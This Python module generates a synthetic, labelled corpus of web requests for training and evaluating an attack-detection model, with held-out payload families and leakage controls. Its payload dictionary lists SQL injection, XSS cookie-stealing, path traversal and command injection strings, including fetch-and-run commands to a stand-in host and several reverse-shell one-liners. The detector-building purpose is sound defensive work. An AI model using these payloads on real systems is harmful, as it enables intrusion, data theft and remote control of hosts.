"""Labelled web-request corpus generator.

IMPORTANT: this is *generated* data (payload patterns written from public attack cheat-sheets, mixed with realistic benign
traffic including deliberately tricky benign requests). It lets the project train and evaluate a text model offline. It is
not a recorded real-world dataset: for credible numbers retrain on real labelled requests with `scripts/train_web_model.py --csv`.

Each attack class has several *families* (styles of payload). Families can be held out of training to measure how well the
model recognises payload styles it has never seen.

Anti-leakage design: benign and attack requests share IDENTICAL structure (same endpoints, one shared parameter-name list,
same decoy parameters and extras such as "Submit=Submit"). An automatic audit (see webmodel.structure_leak_audit) checks that
request structure alone cannot separate the classes.
"""
from __future__ import annotations

import random
from urllib.parse import quote

BENIGN = "Benign"
CLASSES = [BENIGN, "SQL Injection", "XSS", "Path Traversal", "Command Injection"]

FAMILIES = {
    "SQL Injection": {
        "boolean": ["' OR '1'='1", "\" OR \"\"=\"", "1 OR 1=1", "admin'--", "' OR 'a'='a", "1' AND '1'='1", "') OR ('1'='1", "' OR 1=1#", "x' or ''='"],
        "union": ["' UNION SELECT NULL,NULL--", "1 UNION ALL SELECT username,password FROM users", "-1 UNION SELECT 1,@@version,3", "' UNION SELECT table_name,2 FROM information_schema.tables--", "0 union select 1,load_file('/etc/passwd'),3"],
        "time": ["1; WAITFOR DELAY '0:0:5'--", "' AND SLEEP(5)--", "1' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--", "'||pg_sleep(5)--", "1 AND benchmark(5000000,MD5(1))", "' OR SLEEP(5)#"],
        "stacked": ["1; DROP TABLE users--", "'; INSERT INTO users VALUES('a','b');--", "1;EXEC xp_cmdshell('dir')--", "'; UPDATE users SET role='admin' WHERE 1=1--", "1; DELETE FROM sessions--"],
        "error": ["' AND extractvalue(1,concat(0x7e,version()))--", "' AND updatexml(1,concat(0x7e,(select user())),1)--", "1 AND 1=convert(int,@@version)--", "' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--"],
        "blind": ["' AND SUBSTRING((SELECT password FROM users LIMIT 1),1,1)='a", "1 AND ASCII(SUBSTR((SELECT user()),1,1))>64", "' AND (SELECT COUNT(*) FROM information_schema.tables)>0--", "1' AND LENGTH(database())>3--", "' AND ORD(MID((SELECT pass FROM admin LIMIT 0,1),1,1))>77#"],
    },
    "XSS": {
        "script": ["<script>alert(1)</script>", "<script src=//evil.example/x.js></script>", "<ScRiPt>document.location='http://evil.example/?c='+document.cookie</ScRiPt>", "<script>fetch('//evil.example/'+document.cookie)</script>"],
        "handler": ["<img src=x onerror=alert(1)>", "<body onload=alert(1)>", "<svg onload=alert(1)>", "<input autofocus onfocus=alert(1)>", "<video src=x onerror=alert(document.domain)>"],
        "uri": ["javascript:alert(1)", "<a href=\"javascript:alert(document.domain)\">click</a>", "data:text/html,<script>alert(1)</script>", "<a href=javascript:void(fetch('//evil.example'))>x</a>"],
        "attr": ["\" onmouseover=\"alert(1)", "'><script>alert(1)</script>", "\"><svg/onload=alert(1)>", "' autofocus onfocus='alert(1)", "\"><img src=x onerror=prompt(1)>"],
        "tags": ["<iframe src=javascript:alert(1)>", "<details open ontoggle=alert(1)>", "<marquee onstart=alert(1)>", "<object data=javascript:alert(1)>", "<embed src=javascript:alert(1)>"],
        "dom": ["</script><script>alert(1)</script>", "';alert(String.fromCharCode(88,83,83))//", "\\u003cscript\\u003ealert(1)\\u003c/script\\u003e", "<scr<script>ipt>alert(1)</scr</script>ipt>"],
    },
    "Path Traversal": {
        "dots": ["../../../../etc/passwd", "../../../windows/win.ini", "....//....//....//etc/passwd", "../../../../../../etc/shadow", "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts"],
        "encoded": ["..%2f..%2f..%2fetc%2fpasswd", "%2e%2e/%2e%2e/etc/passwd", "..%252f..%252fetc/passwd", "%2e%2e%5c%2e%2e%5cwindows%5cwin.ini", "..%c0%af..%c0%afetc/passwd"],
        "absolute": ["/etc/passwd", "/etc/shadow", "c:\\windows\\system32\\drivers\\etc\\hosts", "file:///etc/passwd", "/proc/self/environ", "/etc/hosts"],
        "nullbyte": ["../../etc/passwd%00.jpg", "....\\....\\boot.ini%00.png", "../../../etc/passwd\x00.pdf", "/etc/passwd%00"],
        "app": ["../../config/database.yml", "../.env", "../../../../var/log/apache2/access.log", "../WEB-INF/web.xml", "../../app/settings.py", "../../../home/user/.ssh/id_rsa"],
    },
    "Command Injection": {
        "semi": [";cat /etc/passwd", "; ls -la", ";id", "; wget http://evil.example/x.sh -O- | sh", ";uname -a", "; curl http://evil.example/s | bash"],
        "pipe": ["| whoami", "|| id", "| nc 10.0.0.1 4444 -e /bin/sh", "|cat /etc/shadow", "| ping -c 4 127.0.0.1"],
        "subst": ["`id`", "`cat /etc/passwd`", "$(whoami)", "$(curl http://evil.example/s|sh)", "$(sleep 5)"],
        "and": ["&& cat /etc/passwd", "& ping -c 4 127.0.0.1", "&& wget http://evil.example/x", "&& whoami", "& dir c:\\"],
        "newline": ["\nid", "\ncat /etc/passwd", "\nwhoami", "\n/bin/ls -l", "\nuname -a"],
        "reverse": ["bash -i >& /dev/tcp/10.0.0.1/4444 0>&1", "python -c 'import socket,os,pty;s=socket.socket();s.connect((\"10.0.0.1\",4444));pty.spawn(\"/bin/sh\")'", "php -r '$s=fsockopen(\"10.0.0.1\",4444);exec(\"/bin/sh -i <&3 >&3 2>&3\");'", "nc -e /bin/sh 10.0.0.1 4444", "powershell -nop -c \"IEX(New-Object Net.WebClient).DownloadString('http://evil.example/p')\""],
    },
}
HOLDOUT = {"SQL Injection": ["error", "blind"], "XSS": ["tags", "dom"], "Path Traversal": ["app", "nullbyte"], "Command Injection": ["newline", "reverse"]}

_ATTACK_ENDPOINTS = {
    "SQL Injection": [("/vulnerabilities/sqli/", "id"), ("/search", "q"), ("/products", "id"), ("/index.php", "id"), ("/login", "username"), ("/api/v1/items", "filter"), ("/item.php", "cat"), ("/news", "article")],
    "XSS": [("/vulnerabilities/xss_r/", "name"), ("/search", "q"), ("/comment", "text"), ("/profile", "bio"), ("/redirect", "next"), ("/guestbook", "msg"), ("/error", "message")],
    "Path Traversal": [("/download", "file"), ("/view", "page"), ("/include.php", "template"), ("/static", "path"), ("/image", "name"), ("/read", "doc"), ("/vulnerabilities/fi/", "page")],
    "Command Injection": [("/ping", "ip"), ("/vulnerabilities/exec/", "ip"), ("/tools/lookup", "host"), ("/api/convert", "file"), ("/diagnostics", "target"), ("/traceroute", "addr")],
}
_BASE_VALUES = ["1", "42", "admin", "8.8.8.8", "home", "report", "john", "index", "example.com", "2024"]
_WORDS = ["wireless", "mouse", "laptop", "stand", "usb", "cable", "monitor", "keyboard", "headphones", "gift", "card", "order", "status", "shoes", "women's", "men's",
          "O'Brien", "select", "update", "drop", "union", "station", "cat", "food", "how to", "id", "cards", "curl", "wget", "rm", "script", "alert", "javascript", "tutorial", "iphone (128gb)", "a&b", "rock;pop", "c++", "node.js", "100%"]
_PAGES = ["/", "/products", "/products/{n}", "/category/{w}", "/search", "/cart", "/checkout", "/login", "/account/orders", "/api/v1/items", "/api/v1/users/{n}", "/blog/{y}/{w}-guide",
          "/docs/{w}", "/contact", "/about", "/robots.txt", "/favicon.ico", "/images/{w}.jpg", "/static/app.{n}.js", "/download/{w}.pdf", "/vulnerabilities/sqli/", "/vulnerabilities/xss_r/", "/ping", "/view", "/redirect"]
_GENERIC_PARAMS = ["q", "page", "sort", "id", "name", "category", "ref", "lang", "limit", "filter", "email", "date", "url", "next", "file", "text", "template", "comment",
                   "s", "query", "search", "item", "user", "target", "ip", "utm_source", "utm_medium"]  # ONE list shared by benign and attack requests
_BENIGN_VALUES = {  # ordinary values for the SAME endpoints/parameters that attacks target
    "SQL Injection": ["1", "2", "42", "7", "admin", "bob", "alice", "books", "electronics", "news", "2024", "john smith", "gordon", "pablo", "5"],
    "XSS": ["Alice", "Bob", "hello", "Great product!", "Thanks for the quick delivery", "I love it", "nice site", "My bio: developer from Berlin", "Page not found", "Hello world"],
    "Path Traversal": ["include.php", "home", "about", "images/logo.png", "report.pdf", "guide.pdf", "summer.jpg", "index.html", "terms", "profile/avatar.png", "docs/manual.pdf", "file1.php", "main.css"],
    "Command Injection": ["8.8.8.8", "127.0.0.1", "example.com", "192.168.1.10", "localhost", "google.com", "report.txt", "10.0.0.5", "server01.local", "1.1.1.1"],
}


def _fmt_page(rng: random.Random) -> str:
    return rng.choice(_PAGES).replace("{n}", str(rng.randint(1, 9999))).replace("{w}", rng.choice(_WORDS).replace(" ", "-").replace("'", "")).replace("{y}", str(rng.randint(2015, 2025)))


def _decoys(rng: random.Random) -> list:
    """0-2 ordinary parameters, as real requests carry them next to the interesting one."""
    out = []
    for _ in range(rng.choice([0, 0, 1, 1, 2])):
        k = rng.choice(_GENERIC_PARAMS)
        out.append(f"{k}={rng.choice(['1', '2', 'en', 'asc', 'home', 'true', str(rng.randint(1, 99)), 'newsletter'])}")
    return out


def _extras(rng: random.Random) -> str:
    """Parameters that real applications append to every request. Shared by benign AND attack requests so they carry no signal."""
    out = ""
    if rng.random() < 0.20: out += "&Submit=Submit"
    if rng.random() < 0.15: out += f"&page={rng.randint(1, 9)}"
    if rng.random() < 0.15: out += "&user_token=" + "".join(rng.choice("0123456789abcdef") for _ in range(32))
    if rng.random() < 0.10: out += "&Login=Login"
    if rng.random() < 0.10: out += "&lang=en"
    if rng.random() < 0.10: out += "&password=[REDACTED]"   # what the privacy policy leaves behind
    return out


def benign_request(rng: random.Random):
    if rng.random() < 0.40:  # same endpoint + parameter an attacker would use, but with an ordinary value
        cls = rng.choice(list(_ATTACK_ENDPOINTS))
        page, param = rng.choice(_ATTACK_ENDPOINTS[cls])
        v = rng.choice(_BENIGN_VALUES[cls])
        v = quote(v, safe="") if rng.random() < 0.5 else v.replace(" ", "+")
        parts = [f"{param}={v}"] + _decoys(rng)
        rng.shuffle(parts)
        return page, "&".join(parts) + _extras(rng)
    page = _fmt_page(rng)
    params = []
    for _ in range(rng.choice([0, 1, 1, 2, 3])):
        k = rng.choice(_GENERIC_PARAMS)
        v = rng.choice([
            lambda: rng.choice(_WORDS), lambda: " ".join(rng.choices(_WORDS, k=rng.randint(2, 4))), lambda: str(rng.randint(1, 500)),
            lambda: rng.choice(["asc", "desc", "price;desc", "name,asc"]), lambda: rng.choice(["en", "fr", "de", "en-US"]),
            lambda: f"user{rng.randint(1,999)}@example.com", lambda: f"2024-{rng.randint(1,12):02d}-{rng.randint(1,28):02d}",
            lambda: "https://example.com/a/b?c=" + str(rng.randint(1, 99)), lambda: "newsletter", lambda: "8.8." + f"{rng.randint(0,255)}.{rng.randint(0,255)}",
            lambda: "report..final.pdf", lambda: "wait... what?", lambda: "I <3 this shop", lambda: '{"price":{"lt":20},"brand":"acme"}', lambda: "a+b=c", lambda: "x=1;y=2",
            lambda: "Q29udGVudA==", lambda: "photos/2024/summer.jpg", lambda: "the user's guide (v2)",
        ])()
        params.append(f"{k}={quote(v, safe=chr(32) + chr(44)) if rng.random() < 0.5 else v.replace(' ', '+')}")
    q = "&".join(params) + _extras(rng)
    return page, q.lstrip("&")


def _mutate(payload: str, cls: str, rng: random.Random) -> str:
    out = payload
    if rng.random() < 0.3:  # random case on keyword-ish characters
        out = "".join(ch.upper() if ch.isalpha() and rng.random() < 0.4 else ch for ch in out)
    if cls == "SQL Injection" and rng.random() < 0.2:
        out = out.replace(" ", rng.choice(["/**/", "%09", "+", "%0a"]))
    if rng.random() < 0.15:
        out = rng.choice(["", "1", "x", "admin"]) + out
    return out


def attack_request(cls: str, rng: random.Random, families=None):
    fam = rng.choice(families or list(FAMILIES[cls]))
    if rng.random() < 0.5:
        page, param = rng.choice(_ATTACK_ENDPOINTS[cls])
    else:  # attackers also hit ordinary pages through ordinary parameters
        page, param = _fmt_page(rng), rng.choice(_GENERIC_PARAMS)
    payload = _mutate(rng.choice(FAMILIES[cls][fam]), cls, rng)
    if cls == "Command Injection":
        payload = rng.choice(["127.0.0.1", "8.8.8.8", "example.com", "report.txt", ""]) + payload
    payload = payload.replace("\n", "%0a").replace("\r", "%0d").replace("\x00", "%00")  # control characters always travel percent-encoded in a request line
    if rng.random() < 0.55:  # attackers (and browsers) percent-encode
        payload = quote(payload, safe="" if rng.random() < 0.5 else "/:=,()'\"<>")
    parts = [f"{param}={payload}"] + _decoys(rng)
    rng.shuffle(parts)
    return page, "&".join(parts) + _extras(rng), fam


def generate(n_per_attack=1500, n_benign=9000, seed=7, train_families=True):
    """Return list of (path, query, label, family). train_families=False yields ONLY the held-out families."""
    rng = random.Random(seed)
    rows = [(*benign_request(rng), BENIGN, "benign") for _ in range(n_benign)]
    for cls in FAMILIES:
        held = HOLDOUT[cls]
        fams = [f for f in FAMILIES[cls] if (f not in held) == train_families]
        for _ in range(n_per_attack):
            path, query, fam = attack_request(cls, rng, fams)
            rows.append((path, query, cls, fam))
    rng.shuffle(rows)
    return rows
